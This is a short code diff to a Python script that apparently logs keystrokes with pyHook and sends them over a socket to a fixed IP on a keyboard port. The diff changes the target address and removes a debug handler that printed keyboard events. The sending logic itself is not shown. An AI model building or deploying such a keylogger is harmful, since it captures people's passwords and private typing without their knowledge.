@@ -1,30 +1,8 @@
 __author__ = 'Cyber-01'
 import pyHook,pythoncom
 import socket
-IP = "192.168.30.31"
+IP = "192.168.30.10"
 KEYBOARD_PORT = 5678
-
-def OnKeyboardEvent(event):
-    print 'MessageName:',event.MessageName
-    print 'Message:',event.Message
-    print 'Time:',event.Time
-    print 'Window:',event.Window
-    print 'WindowName:',event.WindowName
-    print 'Ascii:', event.Ascii, chr(event.Ascii)
-    print 'Key:', event.Key
-    print 'KeyID:', event.KeyID
-    print 'ScanCode:', event.ScanCode
-    print 'Extended:', event.Extended
-    print 'Injected:', event.Injected
-    print 'Alt', event.Alt
-    print 'Transition', event.Transition
-   #789/*- print "Key Hex" ,event.Key ,hex(event.Key)
-    hex_key = event.KeyID
-    print '---'
-
-
-# return True to pass the event to other handlers
-    return True
 
 
 def KeyPress(event,keyboard_socket):
